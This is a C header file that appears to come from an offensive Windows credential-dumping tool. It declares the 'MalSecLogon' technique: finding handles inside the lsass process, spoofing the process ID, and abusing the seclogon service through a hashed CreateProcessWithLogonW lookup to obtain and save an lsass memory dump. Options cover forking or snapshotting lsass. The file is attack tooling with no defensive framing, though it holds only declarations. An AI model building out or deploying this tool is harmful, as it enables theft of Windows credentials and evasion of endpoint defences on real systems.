#pragma once

#include <windows.h>
#include <winternl.h>

#include "nanodump.h"
#include "handle.h"
#include "dinvoke.h"

#if defined(NANO) && !defined(SSP)

#define MAX_HANDLES 10000
#define INVALID_HANDLE 6

#define CreateProcessWithLogonW_SW2_HASH 0x39A92305

typedef struct _HANDLE_LIST
{
    ULONG Count;
    HANDLE Handle[MAX_HANDLES];
} HANDLE_LIST, *PHANDLE_LIST;

struct TEB
{
    struct _NT_TIB NtTib;
    VOID* EnvironmentPointer;
    struct _CLIENT_ID ClientId;
    VOID* ActiveRpcHandle;
    VOID* ThreadLocalStoragePointer;
    struct _PEB* ProcessEnvironmentBlock;
};

typedef BOOL(WINAPI* CreateProcessWithLogonW_t) (LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

PHANDLE_LIST find_process_handles_in_lsass(
    IN DWORD lsass_pid);

VOID change_pid(
    IN DWORD new_pid,
    OUT PDWORD previous_pid);

VOID set_command_line(
    IN BOOL use_malseclogon_locally,
    IN LPWSTR command_line,
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig);

BOOL save_new_process_pid(
    IN PPROCESS_LIST process_list,
    IN DWORD pid);

BOOL check_if_succeded(
    IN DWORD new_pid,
    IN LPCSTR dump_path);

VOID kill_created_processes(
    IN PPROCESS_LIST created_processes);

BOOL MalSecLogon(
    IN LPCSTR binary_path,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST* Pcreated_processes);

BOOL malseclogon_stage_1(
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST process_list);

#ifdef EXE
HANDLE malseclogon_stage_2(
    IN LPCSTR dump_path);
#endif

#endif
